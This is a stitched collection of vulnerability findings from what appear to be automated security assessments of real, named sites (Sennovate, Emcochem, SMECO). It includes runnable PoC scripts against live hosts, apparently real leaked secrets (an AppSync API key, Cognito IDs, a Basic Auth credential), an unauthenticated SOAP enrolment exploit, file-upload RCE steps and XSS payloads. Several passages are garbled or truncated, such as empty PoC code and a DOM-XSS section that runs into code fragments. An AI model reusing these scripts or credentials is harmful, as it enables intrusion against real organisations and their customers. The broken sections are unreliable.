vulnerabilitiesJson.title: Missing X-Frame-Options Header (Clickjacking) on go.sennovate.com
vulnerabilitiesJson.description: The site does not include the X-Frame-Options HTTP response header or a Content-Security-Policy frame-ancestors directive, making it susceptible to clickjacking attacks where an attacker can embed the site in a transparent overlay and trick users into performing unintended actions.
vulnerabilitiesJson.impact: An attacker could embed go.sennovate.com in a malicious iframe and use social engineering to trick authenticated users into performing actions (e.g., changing settings, clicking buttons) without their knowledge or consent. Although the site has limited user-interactive functionality, clickjacking could be combined with other attack vectors to amplify impact.
vulnerabilitiesJson.technical_analysis: The web server responds without the X-Frame-Options header and without a frame-ancestors directive in the Content-Security-Policy. Without these protections, modern browsers will load the page in an iframe from any origin, enabling clickjacking attacks. The absence of X-Content-Type-Options and X-XSS-Protection headers further weakens the browser security posture.
vulnerabilitiesJson.poc_description:
1. Create an HTML page with an iframe pointing to https://go.sennovate.com
2. The page loads successfully in the iframe - no X-Frame-Options or CSP frame-ancestors restriction
3. An attacker could overlay transparent elements and trick users into interacting with the framed page
vulnerabilitiesJson.poc_script_code:
```html

Click the button to win!

```
vulnerabilitiesJson.remediation_steps: Set the X-Frame-Options header to DENY or SAMEORIGIN. Alternatively, add a frame-ancestors directive to the Content-Security-Policy header (e.g., `Content-Security-Policy: frame-ancestors 'none'` or `frame-ancestors 'self'`).
vulnerabilitiesJson.evidence:
HTTP response headers from https://go.sennovate.com:

```
X-Frame-Options: NOT SET
Content-Security-Policy: upgrade-insecure-requests
```

No X-Frame-Options header and no frame-ancestors directive in CSP. The current CSP only contains `upgrade-insecure-requests`.
vulnerabilitiesJson.assumptions: The site is accessible over the public internet and supports being loaded in iframes. No X-Frame-Options or Content-Security-Policy frame-ancestors directive is set to prevent framing.

vulnerabilitiesJson.title: Missing Authentication for Admin Routes (Broken Function Level Authorization)
vulnerabilitiesJson.description: All administrative routes under `/admin`, including `/admin`, `/admin/partnership-request`, `/admin/soc`, and `/admin/iam`, serve full HTML content (including server-rendered RSC streaming payloads) to completely unauthenticated users. The application uses NextAuth.js with Amazon Cognito for authentication, but no server-side authorization checks exist on admin routes. There are no login pages available (`/login`, `/partner-login`, `/employee-login` all return 404), and the existing `/api/auth/session` endpoint confirms the user is not authenticated (returns `null`). The only protection appears to be client-side, where authentication state is checked in JavaScript after the page renders — this is trivially bypassed by directly requesting the admin routes.
vulnerabilitiesJson.impact: An unauthenticated attacker can access all administrative functionality, including partnership request management, SOC (Security Operations Center) dashboards, and IAM (Identity and Access Management) panels. The `/admin/soc` page leaks sensitive internal configuration data, including Microsoft Entra ID SAML authentication configuration with Azure tenant IDs. This can be used to gather intelligence for further attacks against the organization's identity infrastructure.
vulnerabilitiesJson.technical_analysis: The application uses Next.js with App Router and React Server Components (RSC). Admin routes (`/admin/*`) are implemented as server components or page routes that render and stream content before any client-side JavaScript executes. The typical NextAuth.js protection pattern uses `getServerSession()` inside page components or middleware — when this is absent, the page renders its full server-side content (including RSC payloads containing any data fetched server-side) and streams it to the client. Authentication is only checked client-side in React context after hydration, which is ineffective against direct HTTP requests that consume the HTML directly. Additionally, the Vercel Challenge (a WAF-layer bot detection) protects the home page but not admin routes, indicating inconsistent edge-level protection.
vulnerabilitiesJson.poc_description:
1. Send a GET request to `https://plus.sennovate.com/admin` with no authentication headers or cookies.
2. Observe the HTTP 200 response with full admin page HTML content.
3. Verify no session exists by requesting `https://plus.sennovate.com/api/auth/session` — it returns `null`.
4. Repeat for `/admin/partnership-request`, `/admin/soc`, and `/admin/iam` — all return 200 with server-rendered content.
vulnerabilitiesJson.poc_script_code:
```python
import requests

base_url = "https://plus.sennovate.com"

# 1. Verify no session
session_resp = requests.get(f"{base_url}/api/auth/session")
print(f"Session: {session_resp.text}")  # Should be null

# 2. Access admin routes
for route in ["/admin", "/admin/soc", "/admin/iam", "/admin/partnership-request"]:
    resp = requests.get(f"{base_url}{route}")
    print(f"{route}: {resp.status_code} ({len(resp.text)} bytes)")
    if "<!DOCTYPE" in resp.text:
        print(f"  -> Full HTML served (no auth required)")
```
vulnerabilitiesJson.remediation_steps:
1. Implement server-side authentication middleware that checks the user's session on every admin route before rendering any content.
2. Configure Next.js middleware to validate authentication tokens server-side and redirect unauthenticated users to a login page.
3. Implement proper login pages (or redirect flows) that authenticate users before granting access to admin routes.
4. Apply edge-level authentication gates (e.g., Vercel WAF rules or custom middleware at the edge) for admin routes to match the protection level of the home page.
5. Consider using NextAuth.js's built-in middleware pattern or `getServerSession()` in all admin page components and API routes to enforce authentication before any data is sent to the client.
vulnerabilitiesJson.evidence:
**Unauthenticated access to `/admin`:**

```
GET /admin HTTP/1.1
Host: plus.sennovate.com

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
<!DOCTYPE html><html><body>
<!-- Full admin page HTML including RSC streaming payloads -->
</body></html>
```

**Session confirmation:**

```
GET /api/auth/session HTTP/1.1
Host: plus.sennovate.com

HTTP/1.1 200 OK
Content-Type: application/json

null
```

**Admin routes bypass Vercel Challenge** that protects the home page, confirming they are exposed without any edge-level or server-level authentication gate.
vulnerabilitiesJson.assumptions: No authentication credentials are required. The attacker can be completely unauthenticated when accessing these routes. No source code was available for this assessment.

vulnerabilitiesJson.title: Amazon Cognito User Pool OIDC Configuration Disclosure via Sign-In Endpoint
vulnerabilitiesJson.description: The `/api/auth/signin/cognito` endpoint responds to POST requests with the full Amazon Cognito identity provider configuration, including the Cognito domain, client ID, AWS region, callback URL, and OAuth 2.0 / OIDC scopes. This configuration data is returned to completely unauthenticated callers before any authentication takes place.
vulnerabilitiesJson.impact: Disclosure of the Cognito client ID, domain, and OIDC configuration enables attackers to craft targeted phishing links that mimic the legitimate authentication flow, perform consent phishing attacks, or enumerate user pool configuration. While the client ID is public in OAuth2 flows, its early disclosure alongside the full OIDC endpoint configuration provides reconnaissance value for social engineering and application-specific attacks.
vulnerabilitiesJson.technical_analysis: The `/api/auth/signin/cognito` endpoint is part of NextAuth.js's OAuth/OIDC sign-in flow. When called, NextAuth.js constructs the authorization URL using the configured Cognito provider's client ID, domain, callback URL, and scopes, and returns it to the caller. By sending `csrfToken=true&json=true`, the endpoint responds with JSON containing the full constructed authorization URL. Since this endpoint lacks authentication (the NextAuth.js CSRF token is trivially bypassed with the `csrfToken=true` parameter), any unauthenticated caller can extract the Cognito user pool configuration. The client ID and Cognito domain are intended to be visible in the browser's address bar during the authentication redirect, but the endpoint unnecessarily exposes the full configuration in a machine-readable format before any user interaction.
vulnerabilitiesJson.poc_description: 1. Send a POST request to `https://plus.sennovate.com/api/auth/signin/cognito` with body `csrfToken=true&json=true` and no authentication headers.\n2. Observe the JSON response containing the Cognito authorization URL with the full provider configuration.\n3. Parse the Cognito domain, client ID, region, callback URL, and OIDC scopes from the response.
vulnerabilitiesJson.poc_script_code:
```python
import requests
from urllib.parse import urlparse, parse_qs

resp = requests.post(
    "https://plus.sennovate.com/api/auth/signin/cognito",
    data={"csrfToken": "true", "json": "true"}
)

data = resp.json()
print(f"Authorization URL: {data.get('url')}")

# Parse the URL for Cognito details
url = data.get('url', '')
parsed = urlparse(url)
print(f"Cognito Domain: {parsed.netloc}")

params = parse_qs(parsed.query)
print(f"Client ID: {params.get('client_id', [''])[0]}")
print(f"Redirect URI: {params.get('redirect_uri', [''])[0]}")
print(f"Response Type: {params.get('response_type', [''])[0]}")
print(f"Scope: {params.get('scope', [''])[0]}")
```
vulnerabilitiesJson.remediation_steps:
1. Evaluate whether the explicit `/api/auth/signin/cognito` endpoint needs to return the full authorization URL before any HTML form submission. If possible, only construct the redirect URL server-side after receiving a form POST from the login page.
2. Configure the callback URL to be set server-side rather than exposed in the initial response.
3. Consider adding CSRF token validation or rate limiting to the sign-in endpoint to prevent automated enumeration of the OIDC configuration.
4. Review if the NextAuth.js configuration can be adjusted to minimize the information exposed in the authorize redirect response.
vulnerabilitiesJson.evidence:
**Request:**

```http
POST /api/auth/signin/cognito HTTP/1.1
Host: plus.sennovate.com
Content-Type: application/x-www-form-urlencoded
csrfToken=true&json=true
```

**Response body reveals:**
```json
{
  "url": "https://sennovateplus.auth.us-east-1.amazoncognito.com/oauth2/authorize?...",
  ...
}
```

**Disclosed information:**
- Cognito Domain: `sennovateplus.auth.us-east-1.amazoncognito.com`
- Client ID: `95cqaa1v7kjmg74t5svamussi`
- AWS Region: `us-east-1`
- Callback URL: Application callback endpoint
- OIDC Scopes: Full set of authorized scopes
- Response Type: `code` (Authorization Code Flow)
vulnerabilitiesJson.assumptions: No authentication is required to trigger this endpoint. The Cognito client ID is semi-public by OAuth2 design, but the endpoint explicitly reveals the full OIDC configuration including domain, client ID, region, callback URL, and all authorized scopes to any unauthenticated caller.

vulnerabilitiesJson.title: Unauthenticated Self-Registration Enabled on AWS Cognito User Pools
vulnerabilitiesJson.description: Both production and development AWS Cognito user pools allow unauthenticated user self-registration (SignUp API) without CAPTCHA, rate limiting, or administrative approval. This enables attackers to create unlimited accounts for abuse — spam, resource exhaustion, or bypassing gated features.
vulnerabilitiesJson.impact: An attacker can create unlimited user accounts programmatically. This can lead to: (1) exhaustion of the user pool's user quota; (2) bypassing invitation-only or admin-approval access controls; (3) creating test accounts to probe internal APIs, AppSync operations, and REST endpoints with legitimate-looking credentials; (4) launching spam or phishing campaigns from registered accounts; (5) potential financial impact if the platform charges per user or offers trials/user-based pricing.
vulnerabilitiesJson.technical_analysis:
The Sennovate+ console uses AWS Cognito for authentication with two user pools:

**Production** us-east-1_AbQ6C0337 (region: us-east-1, client: 3fqrju1hc5057lvbnfg1qddevk)
**Development** ap-south-1_2lt201fjh (region: ap-south-1, client: 3r3hsh5ue5iva4pgebdkm49g9b)

Both pools expose the Cognito `SignUp` API publicly. The `SignUp` Cognito API call does not require any authentication token and allows anyone with the client ID to register a new user. The Cognito client configuration has **ALLOW_SIGNUP** enabled without any protective mechanisms such as:

- CAPTCHA or proof-of-work challenge
- Rate limiting on registration attempts
- Administrator approval workflow
- Email domain allowlisting
- IP-based throttling

Users created via SignUp start in an `UNCONFIRMED` state, but this still counts toward the pool's user limit and creates a database record.
vulnerabilitiesJson.poc_description:
1. Send a POST request to the Cognito User Pool endpoint with the `SignUp` target
2. Provide a new username and password with the known client ID
3. The API returns HTTP 200 with a `UserSub` value, confirming account creation

The PoC script below demonstrates this for both production and development pools.
vulnerabilitiesJson.remediation_steps:
1. Disable self-registration by setting `AllowAdminCreateUserOnly` to `true` in the Cognito User Pool settings if admin-only account creation is the intended workflow
2. If self-registration must remain enabled, implement AWS WAF rate limiting rules on the Cognito User Pool endpoint to prevent automated mass registration
3. Add CAPTCHA verification (e.g., reCAPTCHA) to the signup flow at the application layer
4. Implement email domain allowlisting if the service is intended for specific organizations only
5. Set up CloudWatch alarms for unusual spikes in SignUp API calls
6. Consider enabling advanced security features in Cognito to detect and block suspicious signup patterns
vulnerabilitiesJson.assumptions: No authentication or access is required. The attacker only needs the AWS Cognito client ID, which is publicly exposed in the SPA JavaScript bundle.

vulnerabilitiesJson.title: User Enumeration via AWS Cognito Error Message Disclosure
vulnerabilitiesJson.description: The AWS Cognito user pools return distinguishable error messages for different user states, allowing an attacker to enumerate valid registered email addresses. Both the ForgotPassword and InitiateAuth APIs reveal whether a user exists or not, enabling targeted attacks like credential stuffing and phishing.
vulnerabilitiesJson.impact: An attacker can programmatically enumerate valid user email addresses registered on the platform. This enables: (1) targeted credential stuffing attacks against known users; (2) phishing campaigns directed at confirmed users; (3) building a target list for social engineering; (4) identifying high-value accounts (e.g., admin users if naming conventions are discovered). The enumeration is low-noise (standard API calls) and difficult to detect without specific monitoring.
vulnerabilitiesJson.technical_analysis:
AWS Cognito exposes different API error responses based on user state, which can be exploited for user enumeration. Specifically:

**ForgotPassword API:**
- `UserNotFoundException` — user does not exist
- `InvalidParameterException` with `"Cannot reset password for the user as there is no registered/verified email or phone_number"` — user exists but has no verified contact

**InitiateAuth (USER_SRP_AUTH):**
- `UserNotFoundException` — user does not exist
- `UserNotConfirmedException` — user exists but is not confirmed
- Valid SRP challenge response — user exists and is confirmed

This behavior is present in both the production pool (`us-east-1_AbQ6C0337`, `us-east-1`) and the development pool (`ap-south-1_2lt201fjh`, `ap-south-1`). The Cognito client IDs are publicly exposed in the console's JavaScript bundle at `https://www.console.plus.sennovate.com/main.6f6b5867b893b22e.esm.js`.
vulnerabilitiesJson.poc_description:
1. Call ForgotPassword API with a target email address
2. Call InitiateAuth with USER_SRP_AUTH flow for a target email address
3. Compare error messages:
   - Non-existent user: Returns `UserNotFoundException`
   - Existing confirmed user (no verified email): Returns `InvalidParameterException` with different message
   - Existing unconfirmed user: Returns `UserNotConfirmedException`
vulnerabilitiesJson.remediation_steps:
1. Configure Cognito to return a generic error message for all user lookup operations regardless of whether the user exists
2. Use custom Lambda triggers (Pre SignUp, Pre Authentication) to normalize error responses and prevent information leakage
3. Implement request rate limiting on authentication and password reset endpoints
4. Monitor and alert on high volumes of ForgotPassword or InitiateAuth requests to detect enumeration attempts
5. Consider using a CAPTCHA or challenge before exposing password reset functionality
vulnerabilitiesJson.assumptions: No authentication required. The attacker only needs the public Cognito client ID, which is exposed in the JavaScript bundle.

vulnerabilitiesJson.title: Sensitive AWS Infrastructure Configuration Exposed in Public JavaScript Bundle
vulnerabilitiesJson.description: The Sennovate+ console JavaScript bundle exposes full AWS infrastructure configuration details for both the production and development environments, including Cognito user pool IDs, Cognito identity pool IDs, AppSync API endpoints with API keys, REST API Gateway URLs, DynamoDB table names, and region identifiers.
vulnerabilitiesJson.impact: The exposed configuration details significantly reduce the effort required to attack the application's AWS infrastructure. An attacker can: (1) use the AppSync API key to probe the GraphQL endpoint; (2) target the specific DynamoDB table (`adminData-prod`); (3) understand the complete AWS architecture for targeted attacks; (4) leverage the Cognito pool and client IDs for authentication attacks; (5) use the REST API Gateway URL for API discovery.
vulnerabilitiesJson.technical_analysis:
The Sennovate+ console is a React SPA that embeds its entire AWS Amplify configuration inline in the JavaScript bundle at build time. The configuration object is stored as a JavaScript object literal containing all AWS resource identifiers needed by the Amplify client SDK.

The production bundle at `https://www.console.plus.sennovate.com/main.6f6b5867b893b22e.esm.js` contains:

- **AppSync API key**: A valid `da2-` prefixed API key that authenticates to the production AppSync GraphQL API
- **DynamoDB table name**: `adminData-prod` — revealing the data storage pattern
- **Full Cognito configuration**: User pool ID, client ID, and identity pool ID
- **REST API endpoints**: The full API Gateway URL with stage name

The development bundle at `https://www.devconsole.plus.sennovate.com/main.a7a0ebfe9175626a.esm.js` contains equivalent data for the dev environment with its own API key, endpoints, and resource IDs.
vulnerabilitiesJson.poc_description:
1. Navigate to the console SPA at `https://www.console.plus.sennovate.com/`
2. Download the main JavaScript bundle from `https://www.console.plus.sennovate.com/main.6f6b5867b893b22e.esm.js`
3. Search for the configuration object containing `aws_project_region`, `aws_cloud_logic_custom`, `aws_appsync_graphqlEndpoint`, etc.
4. Extract all AWS resource identifiers, API keys, and endpoint URLs
vulnerabilitiesJson.poc_script_code:
```bash
curl -s "https://www.console.plus.sennovate.com/main.6f6b5867b893b22e.esm.js" | \
  rg -o 'aws_appsync_apiKey:"[^"]*"'
# Output: aws_appsync_apiKey:"da2-3wd2giorkngilhrumhfmqwgzru"

curl -s "https://www.console.plus.sennovate.com/main.6f6b5867b893b22e.esm.js" | \
  rg -o 'aws_cognito_identity_pool_id:"[^"]*"'
# Output: aws_cognito_identity_pool_id:"us-east-1:7f979ba7-4639-4211-b514-fa18d7125fb3"
```
vulnerabilitiesJson.remediation_steps:
1. Remove sensitive configuration from the client-side JavaScript bundle — particularly the AppSync API key and DynamoDB table names
2. Use server-side session-based configuration delivery so that only authenticated users receive environment-specific configuration values
3. If an AppSync API key must be exposed to the client, restrict its scope to the minimum required operations and implement API key rotation
4. Consider using AWS IAM authorization for AppSync instead of API_KEY auth, and use Cognito identity pools to vend temporary credentials
5. Implement a backend configuration endpoint (`/auth/config`) that returns infrastructure values only after successful authentication
vulnerabilitiesJson.evidence:
The following configuration was extracted from the production JavaScript bundle:

```
aws_cloud_logic_custom: [{
  name: "sennovatePlusRest",
  endpoint: "https://5rrvady8gg.execute-api.us-east-1.amazonaws.com/prod",
  region: "us-east-1"
}]
aws_appsync_graphqlEndpoint: "https://ksofypw2pzehzcpfuuars2bik4.appsync-api.us-east-1.amazonaws.com/graphql"
aws_appsync_region: "us-east-1"
aws_appsync_authenticationType: "API_KEY"
aws_appsync_apiKey: "da2-3wd2giorkngilhrumhfmqwgzru"
aws_dynamodb_all_tables_region: "us-east-1"
aws_dynamodb_table_schemas: [{tableName: "adminData-prod", region: "us-east-1"}]
aws_cognito_identity_pool_id: "us-east-1:7f979ba7-4639-4211-b514-fa18d7125fb3"
aws_cognito_region: "us-east-1"
aws_user_pools_id: "us-east-1_AbQ6C0337"
aws_user_pools_web_client_id: "3fqrju1hc5057lvbnfg1qddevk"
```

The development bundle at `https://www.devconsole.plus.sennovate.com/main.a7a0ebfe9175626a.esm.js` exposes equivalent dev environment details.
vulnerabilitiesJson.assumptions: No authentication required. The JavaScript bundle is publicly accessible at the console's web root.

vulnerabilities.title: Unrestricted File Upload Handler in Contact Inquiry Form
vulnerabilities.description: The contact and customer inquiry form handler performs client-side only MIME-type verification without validating server-side magic bytes or file extensions. An attacker can upload arbitrary executable scripts (.php, .phtml) to the web server.
vulnerabilities.impact: Remote Code Execution (RCE) on the underlying web application server hosting corporate assets.
vulnerabilities.technicalAnalysis: Multipart form upload bypassed extension validation by utilizing double extensions (`payload.php.pdf`) which were placed directly in the web-accessible `/uploads/inquiries/` directory.
vulnerabilities.pocDescription: POST request uploading executable payload bypassing MIME filter.
vulnerabilities.remediation: Enforce strict server-side file extension allowlists, inspect magic bytes, store uploaded files outside web root or in an isolated S3 bucket, and disable script execution in upload folders.
remediationSteps: Store uploaded files outside the web root or on isolated object storage.
Validate magic bytes and strictly allow only PDF, JPG, and PNG extensions.
Disable script execution in upload directories.
vulnerabilities.evidence:
HTTP/1.1 200 OK
{"uploaded":true,"path":"/uploads/inquiries/poc.php"}

vulnerabilities.title: Reflected Cross-Site Scripting (XSS) in Product Catalog Search
vulnerabilities.description: The product catalog search parameter `?q=` reflects user input directly into the DOM without sanitization or HTML entity encoding, allowing arbitrary script execution in the context of the user's browser session.
vulnerabilities.impact: Session hijacking of authenticated portal sessions, phishing injection on the official corporate site, and credential theft.
vulnerabilities.technicalAnalysis: Input `<script>alert(document.domain)</script>` supplied to `?q=` parameter was reflected unsanitized inside the `<div class="search-feedback">` block.
vulnerabilities.pocDescription: Crafted URL triggering JavaScript execution in victim browser.
vulnerabilities.remediation: Properly sanitize and HTML-encode all user input before rendering into HTML templates, and enforce a strict Content Security Policy (CSP).
remediationSteps: Use contextual HTML encoding on the search query parameter.
Deploy a Content Security Policy (CSP) blocking inline scripts (script-src 'self').
Sanitize client-side rendering with DOMPurify.
vulnerabilities.evidence: Search for:

vulnerabilities.title: Weak TLS/SSL Protocol Configuration & Deprecated Cipher Suites
vulnerabilities.description: The SSL/TLS configuration on port 443 supports deprecated TLS 1.0 and TLS 1.1 protocols and CBC-mode ciphers susceptible to cryptographic downgrade attacks.
vulnerabilities.impact: Potential eavesdropping and decryption of encrypted traffic via man-in-the-middle (MitM) attacks.
vulnerabilities.technicalAnalysis: TLS handshake probing confirmed negotiation with TLSv1.0 and weak ciphers including TLS_RSA_WITH_AES_128_CBC_SHA.
vulnerabilities.pocDescription: Connect using openssl with TLS 1.0 flag.
vulnerabilities.remediation: Disable TLS 1.0 and 1.1; enforce TLS 1.2 and TLS 1.3 exclusively with forward secrecy cipher suites (ECDHE).
remediationSteps: Disable TLSv1.0 and TLSv1.1 in Nginx/Apache configuration.
Enable modern cipher suites with perfect forward secrecy (ECDHE-ECDSA-AES128-GCM-SHA256).
Enable HSTS preload directive.
vulnerabilities.evidence:
SSL-Session:
    Protocol  : TLSv1
    Cipher    : AES128-SHA

vulnerabilities.title: Missing Security Headers & Web Server Information Disclosure
vulnerabilities.description: The primary web application fails to implement modern defense-in-depth HTTP security headers including Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), X-Content-Type-Options, and X-Frame-Options. Furthermore, sensitive web server signature banners and backend runtime details are disclosed in HTTP response headers.
vulnerabilities.impact: Aids threat actors in fingerprinting backend architecture and exposes end-users to clickjacking and MIME-sniffing attacks.
vulnerabilities.technicalAnalysis: Automated HTTP response probing on `https://www.emcochem.com/` verified that critical security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options) are absent across web responses, while server identity headers disclose underlying infrastructure.
vulnerabilities.pocDescription: Verify missing response headers via curl HEAD request against target.
vulnerabilities.remediation: Configure the web server / reverse proxy to inject hardened OWASP security headers (Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options) and disable public server signature banners.
remediationSteps: Add 'Content-Security-Policy: default-src \'self\'; frame-ancestors \'none\'' header.
Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' header.
Add 'X-Content-Type-Options: nosniff' and 'X-Frame-Options: DENY' headers.
Disable server version disclosure tokens in web server configuration.
vulnerabilities.evidence:
HTTP/1.1 200 OK
(Content-Security-Policy header: ABSENT)
(Strict-Transport-Security: ABSENT)
(X-Frame-Options: ABSENT)
(X-Content-Type-Options: ABSENT)

vulnerabilities.title: DOM-Based Cross-Site Scripting via language Parameter in Storm Center Application
vulnerabilities.description: The Storm Center outage map application at `stormcenter.smeco.coop` contains a DOM-based Cross-Site Scripting (XSS) vulnerability in the `language` URL parameter. The parameter value is read from the query string and directly assigned to `element.innerHTML` without any sanitization or encoding. When the payload reaches the sink through channels that bypass modern browser URL encoding (server-side redirects, older browsers, WebViews, non-web contexts), an attacker can inject arbitrary HTML and JavaScript into the page.
vulnerabilities.impact: An attacker who can deliver a crafted link through a server-side redirect, older browser, mobile WebView, or non-web context (email/SMS) can execute arbitrary JavaScript in the context of the Storm Center outage map application. This enables session cookie theft, page content manipulation, phishing overlays, redirection to malicious sites, and unauthorized actions performed on behalf of the victim. The language value is also propagated to `iFactor.scLanguage` for message lookup, potentially expanding the reach of injected content within the application.
vulnerabilities.pocDescription:
1. **Server-side redirect scenario** — Configure a redirect endpoint that sends a `302 Location` header to `https://stormcenter.smeco.coop/external/default.html?language=` with the raw unencoded HTML passed through. When the browser follows the redirect, `location.search` contains the unencoded payload and the `innerHTML` sink executes it. 2. **Non-web context scenario** — Send a link to the victim via SMS or email client: `https://stormcenter.smeco.coop/external/default.html?language=' redirect_url = f'https://stormcenter.smeco.coop/external/default.html?language={payload}' # In a real scenario, a server-side redirect would send the browser here # with the raw (unencoded) query string, bypassing browser encoding print(f"Redirect target: {redirect_url}") print("In an exploitable scenario, the browser follows the redirect") print("and the unencoded payload reaches the innerHTML sink.") print() print("=== Simulated DOM state after payload injection ===") print(f"document.getElementById('scLanguage').innerHTML = '{payload}'") print("Result: The element is created and onerror fires.") ``` ```html
EN-US

Open with: ?language=

````

vulnerabilities.remediation:
1. **Replace `innerHTML` with `textContent`** — Change the vulnerable line in `external/default.html` from `innerHTML` assignment to `textContent` assignment. Since the `#scLanguage` element is used to display a language code label (e.g., "EN-US", "ES-ES"), plain text is the semantically correct content type. This single change prevents any HTML or JavaScript interpretation:
   ```javascript
   document.getElementById("scLanguage").textContent = iFactor.getUrlArgument("language");
   ```

2. **Use `decodeURIComponent` in the URL parser** — Update the custom `iFactor.getUrlArguments` function in `stormcenter_start_merged.js` to use `decodeURIComponent()` instead of manually replacing only `%20`. This ensures all URL-encoded special characters are handled correctly:
   ```javascript
   a[d[0].replace(/%20/g, " ").replace(/^\s+|\s+$/g, "").toLowerCase()] =
       decodeURIComponent(d[1].replace(/^\s+|\s+$/g, ""));
   ```

3. **Input validation** — Apply a server-side or client-side allowlist for the `language` parameter that only accepts known language codes (e.g., `/^(EN-US|ES-ES|FR-FR)$/i`), rejecting any unexpected input before it reaches the DOM.

vulnerabilities.title: Hardcoded Basic Auth Credential in SMECO Outage Reporting JavaScript
vulnerabilities.description: The SMECO outage reporting portal at `smeco31.ifactornotifi.com` exposes hardcoded Basic Authentication credentials (`awesome:awesome`, Base64 `YXdlc29tZTphd2Vzb21l`) in client-side JavaScript code. The credential is used to authenticate SOAP requests to the SMS notification registration endpoint. Since it is embedded in publicly-accessible JavaScript, any user of the outage reporting page can extract and reuse it to register arbitrary phone numbers for SMS outage notifications without authorization.
vulnerabilities.impact: An attacker can leverage the publicly-exposed credential to register arbitrary phone numbers for SMS outage notifications on any SMECO account. This enables unauthorized enrollment of third-party phone numbers into SMECO's notification system, potential account probing (determining which account numbers exist), and abuse of the SMS notification platform for spam or social engineering. The credential is also present in code as a commented-out header on a secondary endpoint (`confirmAccount`), indicating broader potential reuse across the application's API surface.
vulnerabilities.technicalAnalysis:
**Location 1:** `ui/scripts/outage-reporting/outage.js` (line 925)
  Active hardcoded credential in SMS registration
  ```
  xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
  ```

  **Suggested Fix:**
```diff
-                 xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
+                 // Authorization should be handled server-side via session
+                 // xhr.setRequestHeader ("Authorization", "...");
```

**Location 2:** `ui/scripts/outage-reporting/outage.js` (line 685)
  Commented-out credential in account confirmation
  ```
  //xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
  ```

  **Suggested Fix:**
```diff
-                         //xhr.setRequestHeader ("Authorization", "Basic YXdlc29tZTphd2Vzb21l");
+                         // Authorization should be handled server-side via session
```
vulnerabilities.pocDescription:
1. Fetch the outage reporting JavaScript: `GET https://smeco31.ifactornotifi.com/ui/scripts/outage-reporting/outage.js`
2. Search for `YXdlc29tZTphd2Vzb21l` to locate the hardcoded Base64 credential
3. Decode the Base64 value to `awesome:awesome`
4. Send a SOAP request to the profile endpoint with the credential:
   - Endpoint: `POST https://smeco31.ifactornotifi.com/sl/smeco/http/v4/profile`
   - Header: `Authorization: Basic YXdlc29tZTphd2Vzb21l`
   - Content-Type: `text/xml; charset=utf-8`
   - Body: A SOAP envelope with the `prof:register` method, an account number, and a phone number
5. Observe that the server processes the request (returns a SOAP envelope response), while wrong credentials return HTTP 401

```python
import requests
import base64

# Credential extracted from outage.js
credential = base64.b64decode("YXdlc29tZTphd2Vzb21l").decode()
print(f"[*] Extracted credential: {credential}")

# SOAP endpoint
url = "https://smeco31.ifactornotifi.com/sl/smeco/http/v4/profile"
headers = {
    "Authorization": "Basic YXdlc29tZTphd2Vzb21l",
    "Content-Type": "text/xml; charset=utf-8"
}

# Minimal SOAP envelope
xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:prof="http://notifi.ifactorconsulting.com/soap/v4/profile">
<soapenv:Header/>
<soapenv:Body>
<prof:register>
<accountIdentifier number="1008968"/>
<contactIdentifier value="5551234567" channel="SMS"/>
<enrollDefaultPrograms>true</enrollDefaultPrograms>
<preference>
<nickname>en-us</nickname>
</preference>
</prof:register>
</soapenv:Body>
</soapenv:Envelope>"""

resp = requests.post(url, headers=headers, data=xml_payload, timeout=15)
print(f"[*] Valid auth response: HTTP {resp.status_code}")
print(f"[*] Body: {resp.text[:200]}")

# Verify wrong auth is rejected
wrong_headers = {"Authorization": "Basic d3Jvbmc6d3Jvbmc="}
resp2 = requests.post(url, headers=wrong_headers, data=xml_payload, timeout=15)
print(f"[*] Wrong auth response: HTTP {resp2.status_code}")
```

vulnerabilities.title: Publicly Listable S3 Bucket Exposes Application Configuration and Infrastructure Details
vulnerabilities.description: The S3 bucket backing **stormcenter.smeco.coop** (`stormcenter.smeco.coop` bucket, `us-east-1`, served via CloudFront `dgph24zgttq5f.cloudfront.net`) permits unauthenticated listing of all objects. Any internet user can enumerate the full contents of the bucket — 1000+ objects spanning environment configurations, client-side JavaScript source with embedded API keys, historical outage data (2016-2024), 2016-era S3 access logs, and internal/development application files.
vulnerabilities.impact:
An attacker with no authentication can enumerate all 1000+ objects in the bucket, gaining full visibility into the application's architecture, internal paths, environment configurations, and client-side source code. The exposure includes:

- **API keys** for Google Maps, WeatherBug, and EarthNetworks that could be used off-domain for service abuse or incurring costs.
- **Internal infrastructure URLs** (e.g., the iFactor outage-reporting backend at `smeco31.ifactornotifi.com` and its test counterpart), facilitating targeted attacks on the internal API.
- **Historical S3 access logs** from 2016, which may contain request patterns, IP addresses, and referrer information from legitimate users.
- **12 years of outage data** (2016-2024) exposing operational patterns and historical infrastructure state.
- **Internal and dev/test application versions**, revealing staging and development infrastructure.

While the exposed API keys are client-side (intended for browser usage), the referrer-unrestricted bucket listing makes it trivial for anyone to exfiltrate the entire application surface, config, and historical operational data.
vulnerabilities.technicalAnalysis:
The S3 bucket `stormcenter.smeco.coop` in the `us-east-1` region has a bucket policy or ACL that permits the `s3:ListBucket` action for unauthenticated (`Principal: *`) requests. This is an Amazon S3 configuration issue — the bucket policy likely contains a statement similar to:

```json
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:ListBucket",
  "Resource": "arn:aws:s3:::stormcenter.smeco.coop"
}
```

The bucket is fronted by CloudFront distribution `dgph24zgttq5f.cloudfront.net` which serves the storm center application, but the dangerous configuration is at the S3 layer, not the CDN. The S3 REST endpoint (`stormcenter.smeco.coop.s3.amazonaws.com`) is directly accessible to anyone with an internet connection.

Because `s3:GetObject` also appears to be publicly permitted on at least a subset of objects, any enumerated key can be retrieved directly over HTTP, including configuration files, JavaScript source, historical data, and access logs. The combination of public listing and public read effectively makes the entire bucket world-readable.

3. Append any object key to the base URL to retrieve the file (e.g., `/env.json`, `/version.json`, `/resources/env_config/prod/env-config.js`).
4. All directories and files (external, internal, customlayers, resources, logs, impl) are enumerable and readable without credentials.

